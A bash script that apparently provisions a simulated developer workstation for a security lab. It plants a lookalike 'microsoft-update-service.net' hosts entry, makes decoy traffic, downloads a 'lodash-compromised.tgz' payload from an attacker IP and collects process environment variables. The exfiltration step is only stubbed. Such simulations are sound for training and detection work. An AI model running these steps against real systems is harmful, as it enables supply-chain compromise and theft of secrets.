#!/bin/bash

echo "DEV-MACHINE-03 initializing..."

echo "172.25.1.10 corp-dc-01.internal.corp" >> /etc/hosts
echo "172.25.1.200 microsoft-update-service.net" >> /etc/hosts

sleep 90

dev_activities() {
    while true; do
        git ls-remote https://github.com/microsoft/vscode > /dev/null 2>&1 || true
        sleep $((RANDOM % 300 + 120))
        
        curl -s https://registry.npmjs.org/lodash > /dev/null 2>&1 || true
        sleep $((RANDOM % 200 + 60))
    done
}

supply_chain_attack() {
    sleep 50
    
    curl -s "http://172.25.1.200:8080/npm/lodash-compromised.tgz" -o /tmp/lodash.tgz || true
    
    node -e "
    const https = require('https');
    const data = JSON.stringify({
        'hostname': 'DEV-MACHINE-03',
        'user': 'developer',
        'env': process.env,
        'cwd': process.cwd()
    });
    " > /tmp/supply_chain.js 2>/dev/null || true
    
    node /tmp/supply_chain.js 2>/dev/null || true
}

dev_activities &
supply_chain_attack &

tail -f /dev/null
